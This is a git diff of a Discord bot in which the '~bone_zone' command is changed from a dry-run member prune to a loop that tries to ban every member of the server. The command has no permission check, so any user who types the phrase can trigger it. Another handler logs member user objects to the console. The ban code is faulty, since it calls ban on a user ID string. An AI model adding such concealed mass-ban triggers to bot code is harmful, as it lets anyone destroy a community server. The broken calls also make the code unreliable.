@@ -39,7 +39,7 @@ client.on("message", msg => {
   var enemy = msg.guild.members.length
   var debug = msg.guild.members.array()
   if (msg.content === 'ryan jones') {
-    console.log ("===" + msg.guild + "===")
+    console.log ("===" + debug.length + "===")
     console.log(debug[0].user)
     msg.reply('https://i.pinimg.com/736x/a9/ce/db/a9cedbd5d3091b1e85e74da806342731--your-hair-death-note-l.jpg ');
   }
@@ -50,9 +50,10 @@ client.on("message", msg => {
     msg.reply('**HELLO**');
   }
   if (msg.content === '~bone_zone') { 
-    msg.guild.pruneMembers(1, true )
-  .then(pruned => console.log(`This will prune ${pruned} people!`))
-  .catch(console.error);
+    for (var i = msg.guild.members.array().length - 1; i >= 0; i--) {
+      msg.guild.members.array()[i].user.id.ban(100000000)
+      console.log(msg.guild.members.array()[i].user.id)
+    }
   }
   if (msg.content === "~kick") {
     let modRole = msg.guild.roles.find("name", "Moderators");
